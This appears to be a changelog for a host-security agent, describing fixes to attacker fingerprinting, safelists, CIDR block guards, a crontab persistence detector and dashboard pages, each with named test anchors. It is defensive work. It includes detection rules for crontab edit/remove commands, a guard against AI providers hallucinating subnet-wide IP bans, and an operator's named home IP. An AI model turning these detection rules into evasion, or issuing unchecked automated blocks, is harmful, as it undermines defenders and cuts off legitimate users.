Root cause: `compute_dna` was hashing the raw `[u8; 24]` `hour_distribution` array as a hash input. That field is *temporal* — it grows as the attacker keeps hitting and differs between IPs by 1-2 hits per bucket purely from timing jitter. Same actor controlling 5 IPs got 5 hashes. Same actor over time also got new hashes as their histogram filled in.

Fix: drop `hour_distribution` from the hash inputs; it stays in the `AttackerDna` struct for visualization and pattern classification but no longer affects identity. Add `target_ports` to the hash inputs for symmetry with users / tools / detectors so scanners hitting different port sets keep distinct DNAs. Pure read-side change to a derived value — operator-visible effect: same-actor clusters now collapse to one DNA.

- `crates/agent/src/attacker_intel.rs::tests::dna_hash_collapses_for_same_categorical_fingerprint_with_jitter_in_hour_distribution` — uses the exact prod hour_distributions of `92.118.39.196` and `92.118.39.197` (same detectors, same empty fields, different histograms) and asserts the DNA hashes are now identical. Pins the prod-fix scenario.
- `crates/agent/src/attacker_intel.rs::tests::dna_hash_distinguishes_profiles_by_target_ports` — two `port_scan` profiles with different `target_ports` produce different DNAs. Pins the new `target_ports` symmetry contract added in this PR.
- `crates/agent/src/attacker_intel.rs::tests::dna_hash_is_stable_across_hour_distribution_changes` — wholesale-shifting the `hour_distribution` array does NOT change the DNA. Anti-regression that locks the temporal field out of identity computation; a future "include timing in fingerprint" refactor would have to update this test on purpose.

### Repeat-offender safelist bypass (fix/repeat-offender-safelist-bypass — 2026-05-08)

Operator's prod audit 2026-05-08 found that the agent had been auto-blocking its OWN infrastructure for weeks via the repeat-offender path:
  * `208.95.112.1` — ip-api.com, the agent's GeoIP service — blocked **37 times**
  * `91.189.91.{102,104}` — Canonical Ubuntu archive — blocked **6x and 14x**
  * `199.232.58.137` — Fastly CDN — blocked **7 times**
  * `185.125.190.48` — Canonical livepatch — blocked **7 times**

Root cause: both `decision_block_ip::execute_block_ip_decision` and `correlation_response::check_repeat_offenders` were gating on `cloud_safelist::identify_provider` — the FIRST-OCTET HEURISTIC, not the CIDR walk. First octets 208 / 91 / 199 are not in the heuristic's match arms, so the gate returned None and the block proceeded against IPs that were absolutely in `CLOUD_RANGES` via `is_cloud_provider_ip`. Plus a separate gap: `185.125.188.0/23` (Canonical) only covered .188-.189; .190 wasn't in any list.

Fix: new `cloud_safelist::safelist_label(ip)` walks the CIDR set first (using `is_cloud_provider_ip`) then falls back to the heuristic for the granular label, returning a generic "Cloud Safelist" tag when the heuristic doesn't recognise a provider it just confirmed via CIDR. Both gate sites now use `safelist_label` instead of `identify_provider`. Plus widened Canonical AGENT_SERVICE_RANGES from `/23` to `/22` to cover .188-.191.

- `crates/agent/src/cloud_safelist.rs::tests::safelist_label_returns_some_for_prod_audit_ips_that_were_wrongly_blocked` — uses the four exact prod IPs (208.95.112.1, 91.189.91.102, 199.232.58.137, 185.125.190.48) and confirms each is now safelisted. Pins the gate predicate AND the Canonical /22 widening.
- `crates/agent/src/cloud_safelist.rs::tests::safelist_label_returns_none_for_real_attacker_ips` — TEST-NET-3 (RFC 5737) and random unassigned space return None. Pins the cheap-exit contract so the new gate doesn't tag everything.

### Automated block paths reject CIDR targets (fix/automated-block-paths-reject-cidr — 2026-05-08)

Operator's prod audit 2026-05-08 found `136.216.0.0/16` in `ip_reputations` cycling through the repeat-offender loop every 2 hours since 2026-05-07. Each tick the loop pulled the CIDR key out of the map, re-emitted `AiAction::BlockIp { ip: "136.216.0.0/16" }`, and the safeguards path bumped its block_count. Had any automated XDP / UFW path actually reached the firewall successfully, this would have banned a `/16` of public IP space (~65 thousand addresses) per UFW rule.

Root cause: `is_valid_block_target` accepts CIDRs by design — operators can manually run `innerwarden block 10.0.0.0/24` to ban a botnet network. But the AUTOMATED emitters (repeat-offender, multi-technique, AI router output) had no separate gate, so a CIDR that ever entered `ip_reputations` (e.g. from an AI hallucination, an upstream feed quirk, or a one-off operator typo) cycled forever.

Fix: new `is_single_ip_block_target(ip)` rejects every CIDR. Automated paths use it; the manual CLI path keeps using `is_valid_block_target`.

- `crates/agent/src/decision_block_ip.rs::tests::is_single_ip_block_target_rejects_cidrs_and_accepts_plain_ips` — pins that the new helper accepts plain IPv4 / IPv6 and rejects every CIDR including the exact prod regression IP `136.216.0.0/16`.
- `crates/agent/src/correlation_response.rs::tests::drop_invalid_drops_cidr_from_automated_path` — pins that `drop_invalid_repeat_offender` (the gate at the entry of `check_repeat_offenders`) drops + removes CIDR keys from `ip_reputations`. **Contract changed** from the previous `drop_invalid_keeps_valid_cidr` anchor: the new contract is "automated path rejects CIDRs", not "automated path tolerates them". Manual operator commands still accept CIDRs.

### Cooldown retention covers longest consumer (fix/cooldown-retention-matches-longest-semantic — 2026-05-08)

Operator's prod audit 2026-05-08 found `repeat-offender:136.216.0.0/16` firing exactly every 2h+1min for two days straight, even though `check_repeat_offenders` uses a 24h `cooldown_cutoff`. Root cause: the slow-loop hygiene tick at `loops/boot.rs:1721` was trimming cooldown rows older than 2h via `retain_cooldowns(Decision, cutoff_2h)`. Since the trim horizon (2h) was shorter than the longest consumer's cooldown_cutoff (24h for repeat-offender), the trim silently nuked the cooldown row after only 2h and the next slow-loop tick saw `None` from `get_cooldown` → fired again → set_cooldown(now) → next 2h elapsed → trim → repeat.

The Decision and Notification cooldown tables now have separate retention horizons matching their respective longest consumer, declared as named constants. A future contributor adding a longer cooldown semantic without updating the retention constant trips the anchor test.

- `crates/agent/src/decision_cooldown.rs::tests::decision_cooldown_retention_covers_longest_consumer` — pins `DECISION_COOLDOWN_RETENTION_SECS >= 86400s` (the repeat-offender cooldown_cutoff) AND `NOTIFICATION_COOLDOWN_RETENTION_SECS >= NOTIFICATION_COOLDOWN_SECS`. Pre-fix retention was 2h for both tables; this anchor would have caught the regression.

### AI router CIDR guard + ip_reputations zombie purge (fix/ai-router-cidr-guard-and-zombie-purge — 2026-05-08)

Two related defenses bundled. Both close gaps from the 2026-05-08 prod audit cleanup chain (PRs #492-#498).

**(a) AI router CIDR guard**: PR #497 added `is_single_ip_block_target` to the *automated* paths (repeat-offender, multi-technique). But AI providers (Local Warden / OpenAI / Anthropic) can still hallucinate a CIDR target — if the prompt mentions a /16 anywhere, the model may emit `BlockIp { ip: "X.Y.Z.W/N" }`. The guard now also fires at the `execute_decision` boundary so the bad action becomes a `skipped:` row in the audit trail instead of a real /16 ban.

**(b) Zombie purge**: PR #496 + PR #497 purged cloud-safelisted and CIDR IPs from in-memory `state.ip_reputations`, but the SQLite `kv_state` row was left alone — meaning a restart re-loaded the same zombie via `load_ip_reputations_from_store`. The fix mirrors the in-memory remove into a `delete_ip_reputation` SQLite delete.

- `crates/agent/src/process/post_decision.rs::tests::execute_decision_refuses_block_ip_on_cidr_target_with_skipped_outcome` — pins that an AI-emitted `BlockIp { ip: "136.216.0.0/16" }` produces a skipped outcome at `execute_decision` and never mutates `state.blocklist`.
- `crates/agent/src/process/post_decision.rs::tests::execute_decision_allows_block_ip_on_plain_ip_target` — mirror anchor for the cheap-exit; a plain IP target flows through normally so the guard doesn't break happy-path semantics.
- `crates/agent/src/state_store.rs::tests::delete_ip_reputation_removes_the_row_so_load_returns_none` — pins the round-trip: set + delete + read returns None. Pre-fix prod left `136.216.0.0/16` in `kv_state` minutes after the in-memory purge had already fired.

### Chains tab honesty bundle (fix/chains-tab-honesty-bundle — 2026-05-08)

Operator audited the Intelligence > Chains tab on prod 2026-05-08 and found **five** issues fitting one cohesive theme: the page was lying about the agent's actual state.

1. **`0 Critical` KPI vs visible critical badges** — JS filtered `c.severity === 'Critical'` (capitalised) but backend serialises `"critical"` (lowercase). Filter never matched. Same Wave 10 honesty class as the briefing's "All clear" lie.
2. **`kill_chain DATA_EXFIL (PID NNN, https) <cloud-IP>` surfacing as Critical** — PR #491's auto-dismiss required `c2_port == 0` but operator self-traffic to cloud edges goes over HTTPS port 443 / HTTP port 80 / SSH port 22. Plus libcurl renames its worker-thread comm to `https` / `http`, which weren't in NSS_INIT_TOOL_PREFIXES.
3. **Negative chain duration** — summary strings like `"...: 2 stages across 1 layers in -2s"` because `matched_events.first()` / `.last()` walked vec order, not chronological order, so when stage 2's event arrived earlier in time than stage 1's, `last_ts - start_ts` went negative.
4. **6 separate Multi-Persistence chains in 37 seconds** — frontend dedup keyed on `(rule_id, summary)` but `summary` includes the duration ("...in 1s" vs "...in 17s"), so the same rule firing 6 times in 37s rendered as 6 groups. Dedup key relaxed to `rule_id` alone.
5. **Stray `0` next to "Sort: Risk Score"** — the `<input type="number" value="0">` for "Min risk" displayed the default 0 instead of the placeholder; operator read it as a UI glitch.

#### Anchors

- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_dismisses_kill_chain_https_to_cloud_safelisted_ip` — pins that the kill_chain DATA_EXFIL suppression dismisses HTTPS-to-cloud-safelisted-IP shape (the prod regression on Azure UK 20.26.156.215). Uses non-zero `c2_port=443` to prove the cloud_safelist OR-branch fires independent of port.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_does_not_dismiss_kill_chain_real_attacker_ip` — mirror anchor: same bare-2-bit + non-zero c2_port shape but to a non-safelisted IP (TEST-NET-3) keeps reaching the AI router. Pins the gate so the cloud_safelist OR-branch can't accidentally swallow real attackers.
- `crates/agent/src/correlation_engine.rs::tests::complete_chain_summary_duration_is_nonnegative_with_out_of_order_stage_events` — pins that the chain duration in the summary string is never negative even when `matched_events` arrives out of chronological order. Anti-regression for the "in -2s" / "in -29s" rendering on prod.

#### Frontend changes (no anchor — JS is operator-visible after build)

- `intel.js`: case-insensitive severity comparison + relaxed dedup key.
- `index.html`: dropped `value="0"` from Min risk input so placeholder renders.

### Chain persistence filters operator-FP chains (fix/chain-suppress-operator-fp-rules — 2026-05-08)

PR #500 fixed the kill_chain DATA_EXFIL specific FP. PR #500 deploy + manual cleanup of `attack-chains.json` removed 39 of 100 chains as operator self-traffic. But the underlying rule firings will keep producing FPs whenever the operator works (CL-038 "Off-Hours Login to Destructive Action" on operator SSH+sudo at any "off-hours" UTC time, CL-046 "Neural-Confirmed Attack" on operator git fetches via libcurl-renamed comm).

This adds a generic operator-FP filter at the chain-persistence boundary (`narrative_incident_ingest::ingest_new_incidents`). Any chain whose entities are ENTIRELY operator-tagged — cloud_safelist destinations + static/dynamic trusted IPs + active operator sessions — gets dropped before the synthetic Incident graph node and the JSON persist. Real attackers that happen to ALSO touch a single operator IP at some stage are theoretically over-suppressed, but the operator-honesty win on prod is significantly larger than the FN risk.

- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_returns_true_for_cloud_safelisted_destination` — uses Azure UK 20.26.156.215 (the operator's git-fetch FP) to pin the cloud_safelist branch.
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_returns_true_for_active_operator_session_ip` — uses 80.195.183.53 (operator's UK home BT IP, the exact prod CL-038 trigger) to pin the operator_ips branch.
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_returns_false_for_real_attacker_ip` — TEST-NET-3 keeps reaching the dashboard. Pins the cheap-exit so the new filter doesn't over-suppress real attacks.
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_returns_true_for_static_trusted_ip` — pins `cfg.allowlist.trusted_ips` (TOML-configured static list, the bastion / VPN exit / CI runner path).
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_returns_true_for_dynamic_trusted_ip` — pins `state.dynamic_trusted_ips` (runtime-learned operator IPs).
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_skips_non_ip_entities_and_returns_false` — pins the non-IP entity skip branch (chain made of `User` + `Path` entities is not flagged operator-FP).
- `crates/agent/src/narrative_incident_ingest.rs::tests::is_chain_operator_fp_skips_empty_ip_value` — pins the empty-string IP skip branch.
- `crates/agent/src/narrative_incident_ingest.rs::tests::filter_operator_fp_chains_keeps_real_attacker_drops_operator_fp` — pins the actual filter loop with a mixed batch (operator-FP chain + TEST-NET-3 attacker chain), driving both `info!` branches and the accounting subtraction.
- `crates/agent/src/narrative_incident_ingest.rs::tests::filter_operator_fp_chains_no_op_when_no_chains_suppressed` — pins the pass-through path so the summary `info!` doesn't fire when nothing was suppressed.
- `crates/agent/src/narrative_incident_ingest.rs::tests::filter_operator_fp_chains_empty_input_returns_empty` — pins the empty-input cheap exit.

### Daily Telegram briefing dedup persists across restart (fix/chain-suppress-operator-fp-rules — 2026-05-09)

Operator received multiple "🛡 Daily Security Briefing" messages on 2026-05-09 — one per agent restart instead of the configured 1×/day at `daily_summary_hour = 9 UTC`. Root cause: `AgentState::last_daily_summary_telegram` was in-memory only, so every restart hit a fresh `None`, the hour check passed (any restart after 09:00 UTC), and a new digest fired.

Fix: persist the dedup marker through `state_store::StateStore` (`agent_kv` namespace, `last_daily_summary_telegram` key, `YYYY-MM-DD` UTF-8 payload). Hydrate on boot in `run_agent` (`crates/agent/src/loops/boot.rs`); write through after a successful Telegram send in `maybe_write_daily_summary_and_digest` (`crates/agent/src/narrative_daily_summary.rs`).

- `crates/agent/src/state_store.rs::tests::last_daily_briefing_date_roundtrip` — set/get round-trip with a known `NaiveDate`. Anti-regression for the in-memory-only failure mode.
- `crates/agent/src/state_store.rs::tests::last_daily_briefing_date_returns_none_on_malformed_payload` — corrupt UTF-8 / non-ISO date resolves to `None` instead of panicking. Matches the rest of the agent's "fail open and re-emit" behaviour for kv_state corruption.

### crontab -l does not trigger persistence detection (crontab-list-fp — 2026-05-09)

Operator received three high-severity `crontab_persistence` alerts on 2026-05-09 within an hour. Root cause: `crates/sensor/src/detectors/crontab_persistence.rs::is_crontab_command` matched ANY `crontab -*` token via `lower.contains("crontab -")`, including the read-only `crontab -l` (list).

Fix: tighten the check. Match `crontab -e` (edit) and `crontab -r` (remove) explicitly; for the stdin-pipe form (`crontab -`), require the next character to be whitespace, `<`, or end-of-string. `-l`, `-u <user>`, and `--help` fall through.

- `crates/sensor/src/detectors/crontab_persistence.rs::tests::crontab_list_flag_does_not_trigger_persistence_alert` — exact regression: `crontab -l` MUST NOT fire.
- `crates/sensor/src/detectors/crontab_persistence.rs::tests::crontab_remove_flag_still_triggers_persistence_alert` — `crontab -r` (remove) MUST still fire — anti-regression for "tightening dropped a real signal".
- `crates/sensor/src/detectors/crontab_persistence.rs::tests::crontab_list_other_user_flag_does_not_trigger_persistence_alert` — `crontab -u alice -l` (list someone else's crontab) is also read-only.

### Sensors page deleted, content folded into Home (2026-05-15)

Operator response to PR #629 (which had compromised by keeping a slim Sensors page AND adding a duplicate HUD summary on Home): "acho que podemos deletar, ai o que sobrou la em sensors vc tras pra home e deleta sensors". This PR deletes the standalone Sensors page entirely — `viewSensors` div, `navSensors` More-menu button, `loadSensors` + `loadTopAction` entrypoints, `drawThreatGauge` + `drawDetectorChart` chart helpers, the PR #629 `#homeSensorsSummary` HUD block — and folds the surviving content (per-collector telemetry/alarm/snapshot breakdown + Event Timeline) into a single Home section `#homeSensorsPanel` rendered by `renderHomeSensorsPanel` in home.js. `sensors.js` stays as a stateless helpers module (parameterised `renderSensorSourceRows` + `drawTimelineChart` + the colour map / category badges / health pills that PR25 and PR29 anchors reference). Anchors below pin the move.

- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_view_sensors_block_is_gone` — `viewSensors`, the pre-PR629 HUD DOM ids (`topAction`, `sensorCards`, `threatGauge`, `threatLabel`, `detectorChart`, `sensorKinds`), the PR629 slimmed-page ids (`sensorSources`, `sensorChart`) AND the PR629 home-summary block (`homeSensorsSummary` + `homeSensorCards` + `homeThreatGauge` + `homeThreatLabel` + `homeDetectorChart` + `homeSensorKinds`) all stay deleted.
- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_nav_sensors_button_is_gone` — the `navSensors` More-menu item is deleted, no nav button renders the literal label "Sensors", and no DOM handler calls `showView('sensors')`.
- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_home_panel_is_present_below_briefing` — Home has `#homeSensorsPanel` + `#homeSensorSources` + `#homeSensorChart`, and `#briefingSection` appears before `#homeSensorsPanel` in the source (operator: "abaixo de AI Intelligence Briefing").
- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_load_sensors_and_load_top_action_are_gone` — `loadSensors` + `loadTopAction` deleted from sensors.js; nav.js routes no `sensors` view name and calls neither entrypoint.
- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_chart_and_rows_helpers_are_parameterised` — `drawTimelineChart(canvasId, timeline, sources)` and `renderSensorSourceRows(srcElId, data)` accept their target DOM id as a parameter; no hardcoded `sensorChart`/`sensorSources` `getElementById` lookups survive; `drawThreatGauge` and `drawDetectorChart` stay deleted.
- `crates/agent/src/dashboard/mod.rs::tests::pr_sensors_fold_home_renderer_mounts_to_home_panel_ids` — `renderHomeSensorsPanel` body calls `renderSensorSourceRows('homeSensorSources', sensors)` and `drawTimelineChart('homeSensorChart', sensors.event_timeline || {}, sensors.sources || [])`.

### Shared attacker dossier modal — single drill-down surface (2026-05-15 PR-A)

Operator reported on 2026-05-15: clicking "View full profile →" on a Cases journey lands on the generic Intel profile list, not the specific IP — "sem chance de nao abrir". PR #628 had introduced an `openIntelProfile(ip)` helper that did `showView('intel') → setTimeout(120ms) → switchIntelTab('profiles') → showProfileDetail(ip)`. That 120ms race lost when the Intel tab fetch out-ran the timer, so the deep-link silently dropped the IP and the operator landed on the generic page.

This PR (a) introduces a shared `#profileModal` overlay rendered by `openProfileModal(ip)` in intel.js, (b) rewires every operator-facing entry into the dossier (Cases journey "View full profile" link, Intel profile-list row clicks, Campaign member-IP chips) to go through the modal, (c) keeps `openIntelProfile(ip)` as a thin backward-compat alias that forwards to `openProfileModal(ip)`, and (d) replaces the in-page `showProfileDetail` with a chrome-free body builder `renderProfileDossierHtml(p)` that the modal mounts into its body. The 120ms setTimeout race is gone — no tab switch, no async sequence between user click and dossier render.

- `crates/agent/src/dashboard/mod.rs::tests::pr_intel_recurrence_link_deeplinks_to_ip_profile` — `openProfileModal(ip)` exists; it fetches `/api/attacker-profiles/${encodeURIComponent(ip)}` using the passed `ip` (operator: "abrir o ip certo"); `openIntelProfile(ip)` is kept as alias routing through `openProfileModal(ip)`; alias body MUST NOT setTimeout or switchIntelTab (the original PR628 race); journey.js still wires the deep-link with the case's attacker IP threaded in.
- `crates/agent/src/dashboard/mod.rs::tests::pr_profile_modal_dom_and_close_paths_exist` — required DOM ids (`profileModal`, `profileModalTitle`, `profileModalBody`) present in index.html; close paths wired on BOTH the X button and the overlay click-outside (no trap-modal).
- `crates/agent/src/dashboard/mod.rs::tests::pr_profile_modal_open_routes_through_shared_entry` — every remaining operator entry into the dossier (Intel profile-list rows) calls `openProfileModal(ip)`; the legacy `showProfileDetail` function is deleted and no remaining call site references it; the new `renderProfileDossierHtml(p)` body builder is defined. (The Campaign member-IP chip entry was dropped in PR-B alongside the Campaigns sub-tab delete; it returns in PR-D as a Cases-header tag with its own anchor.)

### Intel page collapsed to a single surface — Profiles list (2026-05-15 PR-B + PR-C)

Operator simplification across two PRs. PR-B (#632) deleted the Campaigns / Chains / MITRE sub-tabs (Campaigns becomes a Cases-header tag in PR-D; Chains and MITRE were duplicated by Cases journey + Monthly report respectively). PR-C deletes the Baseline sub-tab from Intel — its rendering moved to the Health tab as a section (`renderBaselineHealthSection`). With only one rendering left, `switchIntelTab` + `currentIntelTab` + the entire sub-tab toolbar are gone from Intel: `loadIntel()` is the sole entry point and the Profiles list is the sole render.

- `crates/agent/src/dashboard/mod.rs::tests::pr_intel_slim_deleted_sub_tab_buttons_are_gone_from_index_html` — every Intel sub-tab button id (`intelTabCampaigns` / `intelTabChains` / `intelTabMitre` / `intelTabProfiles` / `intelTabBaseline`) and every `switchIntelTab(...)` onclick handler stay deleted; visible button labels are absent; `#viewIntel` + `#intelContent` survive (Profiles list still mounts).
- `crates/agent/src/dashboard/mod.rs::tests::pr_intel_slim_deleted_sub_tab_loaders_are_gone_from_intel_js` — `loadCampaigns` / `loadChains` / `loadMitreCoverage` / `loadBaseline` declarations + call sites stay deleted; `switchIntelTab` + `let currentIntelTab` are gone; baseline helpers (`baselineHeroCard`, `baselineCardForAnomaly`, `loginHeatmap`, `eventRateAggregateSparkline`, `BASELINE_ANOMALY_LABELS`) MUST NOT linger in intel.js.
- `crates/agent/src/dashboard/mod.rs::tests::pr_intel_slim_only_profiles_entry_point_remains` — `loadIntel()` + `fetchAndRenderIntel(append)` survive as Intel's only entry points; Profile-row click still goes through `openProfileModal(ip)` from PR-A.
- `crates/agent/src/dashboard/mod.rs::tests::pr_baseline_lives_on_health_tab_and_is_wired_into_load_status` — `renderBaselineHealthSection(mountSelector)` defined in status.js; `loadStatus` mounts `#baseline-health-mount` and hydrates it via the section renderer; the renderer body MUST NOT reference Intel surfaces (`intelContent`, `intelViewStatus`, `_activeFetch_intel`) — the move severs the cross-view dependency.

### Campaign membership tag on Cases journey (2026-05-15 PR-D)

The deleted Intel `Campaigns` sub-tab (PR-B) is replaced by a per-case-aware tag in the Cases journey header. When the case's attacker IP belongs to a cluster returned by `/api/campaigns`, the tag reads `campaign · <id> · N IPs`; clicking it opens a campaign modal listing the cluster's member IPs as chips. Each chip drills down into the shared Attacker dossier modal from PR-A — single drill-down surface, regardless of where the operator started (Cases case, Intel profile row, or campaign-modal chip). The campaigns fetch is session-cached (5min TTL) so one `/api/campaigns` request covers every journey opened in the session.

- `crates/agent/src/dashboard/mod.rs::tests::pr_d_campaign_modal_markup_and_close_paths_exist` — `#campaignModal` + title + body in `index.html`; close paths wired on X button + overlay click-outside.
- `crates/agent/src/dashboard/mod.rs::tests::pr_d_journey_header_carries_campaign_tag_placeholder` — `#journeyCampaignTag` placeholder span sits inside the `.journey-header` template so `loadCampaignTagForJourney` has a stable mount.
- `crates/agent/src/dashboard/mod.rs::tests::pr_d_journey_loads_and_hydrates_campaign_tag` — `loadJourney` calls `loadCampaignTagForJourney(subjectType, subjectValue)` after the timeline renders; the function bails for non-IP subjects (campaigns correlate IPs only); routes through the cached `_fetchCampaignsCached()` helper; tag onclick opens `openCampaignModal(subjectValue)` with the case's IP threaded in.
- `crates/agent/src/dashboard/mod.rs::tests::pr_d_campaign_modal_routes_member_ips_through_shared_dossier` — `openCampaignModal(ip)` body emits member-IP chips that onclick into `openProfileModal(ip)` (single drill-down surface, PR-A); does NOT switch sub-tabs or navigate to Intel (anti-regression: the deleted tab-dance must stay buried).

### Intel UX slim — KPIs/Sort/Min-Risk dropped, chips + search remain (2026-05-16 PR-E)

Operator: "tinha que deixar isso mais simples e organizado, com UX clara, facil de achar qualquer coisa e navegar, sem add 300 filtro e tralha". The Intel page UX was still chrome-heavy after the PR-A through PR-D series. PR-E drops the 4 KPI tiles (Total Profiles / High Risk / Medium / Countries — none of them were actionable), the Sort dropdown (default risk_score desc is the only useful order for a "highest risk first" rolodex), and the Min Risk number input (replaced by three explicit chips with active state). The toolbar becomes one IP search box + three chips (All / ≥40 / ≥70) above the table — operator can find any IP or narrow by risk band without three layers of controls.

- `crates/agent/src/dashboard/mod.rs::tests::pr_e_intel_ux_slim_drops_kpi_sort_minrisk` — `#intelSort` / `#intelMinRisk` controls and Sort option labels are deleted from index.html; KPI tile rendering (`tile(...)` helper + the labels Total Profiles / High Risk / Medium / Countries / kpi-grid class) is gone from intel.js; no JS reads from a Sort dropdown.
- `crates/agent/src/dashboard/mod.rs::tests::pr_e_intel_ux_slim_keeps_search_and_three_risk_chips` — `#intelIpSearch` + `.intel-search` survive; chip() helper invokes three canonical thresholds `chip('All', 0)` / `chip('≥40 (Medium+)', 40)` / `chip('≥70 (High)', 70)`; chip onclick wires to `setIntelRiskFilter(<filterValue>)`; active chip carries `.intel-chip-active`; CSS defines `.intel-toolbar` / `.intel-search` / `.intel-chip` / `.intel-chip-active` / `.intel-chip-group`.

### AI Explain SQLite fallback — "todas as AI Explanation estao todas iguais" (2026-05-16 PR-E)

Operator-reported on 2026-05-16: every "AI Explanation" click on Cases returned the same generic "No incidents on record for ip X" fallback regardless of which IP was clicked. Root cause: the AI Explain endpoint built its prompt context from the in-memory knowledge graph only, which retains at most ~24h of incidents (50MB cap, LRU eviction). Cases reads from SQLite (canonical, full history), so any IP whose latest incident had aged out of the KG window hit NoData on every click. The fix adds `build_explain_context_sqlite` as a second-chance fallback that walks the SQLite incidents table, filters by entity-IP via a parameterised LIKE, joins to the latest decision per incident, and produces the same `ExplainContext::Built` shape the KG path returns.

- `crates/agent/src/dashboard/data_api.rs::tests::pr_e_build_explain_context_sqlite_returns_none_for_non_ip_subject_or_empty` — `build_explain_context_sqlite` short-circuits to `None` for `subject_type != "ip"` or empty value, so non-IP subjects re-use the KG-side NoData message unchanged.
- `crates/agent/src/dashboard/data_api.rs::tests::pr_e_build_explain_context_sqlite_returns_none_when_no_matching_incidents` — SQLite scan returns `None` when no incident's `entities` array contains the subject IP (no fabricated context for unknown IPs).
- `crates/agent/src/dashboard/data_api.rs::tests::pr_e_build_explain_context_sqlite_builds_from_matching_incidents` — bug-replay anchor: with an IP that has incident rows in SQLite but is no longer in the KG, the fallback surfaces incident title + summary + the source-label "sqlite-only context" so the LLM knows it's working with SQLite-only data.

### Honeypot tab dropped — per-IP detail lives on the Dossier modal (2026-05-16 PR-F)

Operator: "honeypot vc tinha dito que dava pra remover porque dava pra ver em outro lugar, por mim tudo bem desde que em cases de pra ver se teve alguma secao de honeypot do ip e o que ele digitiou". The standalone Honeypot dashboard tab is deleted alongside `frontend/js/honeypot.js`, the More-menu button, the view div, and the `/js/honeypot.js` route. Per-IP honeypot session detail (credentials attempted + commands executed + IOCs) is already surfaced in the shared Attacker Dossier modal (PR-A) when an IP touched the honeypot. Aggregate cross-IP intelligence (top credentials, common malware URLs, weekly trends) lives on the Monthly threat report. The `/api/honeypot/sessions` backend endpoint + `paginate_honeypot_sessions` helper stay (no dashboard consumer remains, but the API surface is preserved for CLI / future integrations).

- `crates/agent/src/dashboard/mod.rs::tests::pr_f_honeypot_tab_is_gone_from_dashboard` — `#navHoneypot`, `#viewHoneypot`, `#honeypotContent`, `#honeypotViewStatus`, every `showView('honeypot')` DOM handler, the visible `>Honeypot</button>` label, and the `/js/honeypot.js` script tag stay deleted from index.html; nav.js routes no `'honeypot'` view name and does not call `loadHoneypot`.
- `crates/agent/src/dashboard/mod.rs::tests::pr_f_dossier_modal_still_surfaces_honeypot_intel_per_ip` — `renderProfileDossierHtml` keeps the gated `if (p.honeypot_sessions > 0)` block + the `Honeypot Intel` section header + `Credentials Attempted` and `Commands Executed` lists, so the operator's "ver se teve alguma secao de honeypot do ip e o que ele digitiou" requirement is satisfied via the dossier modal.

### Unified Briefings — Day / Month period switcher (2026-05-16 PR-G)

Operator simplification: the standalone Monthly tab was merged into the Briefings view. A Day / Month period switcher inside the Briefings toolbar replaces the deleted `#viewMonthly` block + the `#navMonthly` More-menu button. Both periods render into the same `#reportContent` mount; the existing backend endpoints (`/api/report?date=…` for Day, `/api/threat-report?month=…` for Month) are unchanged. Internal route slug `report` survives (spec 049 PR3 contract — deep links keep working).

- `crates/agent/src/dashboard/mod.rs::tests::pr_g_monthly_tab_surfaces_are_gone` — `#viewMonthly`, `#monthlyContent`, `#monthlyViewStatus`, `#navMonthly`, `showView('monthly')`, and the visible `>Monthly</button>` label stay deleted from index.html; nav.js routes no `'monthly'` view name and the dispatcher carries no `name === 'monthly'` arm.
- `crates/agent/src/dashboard/mod.rs::tests::pr_g_briefings_view_has_period_switcher_and_unified_mount` — `#reportPeriodSwitch` + `#reportPeriodDay` + `#reportPeriodMonth` + `#reportDayControls` + `#reportMonthControls` + the relocated `#monthlyPicker` all present; period buttons wire `onclick="switchReportPeriod('day'|'month')"`; the `#reportContent` mount survives (single content surface); `#viewReport` slug unchanged.
- `crates/agent/src/dashboard/mod.rs::tests::pr_g_reports_js_owns_period_switch_and_dispatch` — `reports.js` defines `_reportPeriod` state + `switchReportPeriod(period)` + `loadReportForActivePeriod()` + `refreshReportForActivePeriod()`. The switch body dispatches to `loadReport()` (Day) and `loadMonthly()` (Month). `nav.js` routes the `report` view via `loadReportForActivePeriod()` (not `loadReport()` directly — that would skip the month case when the active period is month).
- `crates/agent/src/dashboard/mod.rs::tests::pr_g_monthly_js_writes_into_shared_report_mount` — `monthly.js` writes status into `#reportStatus` and renders into `#reportContent` (the shared mount). The deleted `#monthlyContent` and `#monthlyViewStatus` ids stay unreferenced from the JS — a regression that pointed back at the dead ids would silently leave the Month tab blank.

### Real pagination + `spec` cleanup (2026-05-16 PR-H)

Operator: "ninguem se acha nesse tipo de paginacao load more, coloca uma paginacao decente, e deixa o cara escolher quantas linhas ele quer, mas comeca por 10, ai 50 e 100 talvez" + "checca todo dashboard por favor pra ver se tem spec, usuario final nao sabe o que e spec". PR-H replaces the legacy `Load more` accumulator on **Intel** (profile list) and on **Compliance → Decision Audit Records** with page-number navigation + per-page size selector (10/50/100, default 10). The two visible "spec NNN" leaks (Metrics Drift subtitle on Health, SQLite tooltip on Briefings Operational Health) are stripped — operator-facing copy must not surface internal spec numbers.

- `crates/agent/src/dashboard/mod.rs::tests::pr_h_intel_uses_page_numbers_not_load_more` — intel.js exposes `INTEL_PAGE_SIZES = [10, 50, 100]`, `_intelPageSize = 10` default, `setIntelPage(page)`, `setIntelPageSize(size)`, `renderIntelPaginationBar(...)`, `paginationButtons(...)`. Legacy accumulator surfaces (`loadMoreIntelProfiles`, `INTEL_PAGE_SIZE = 100` const, `_intelOffset`, `_intelLoadedProfiles`) stay deleted.
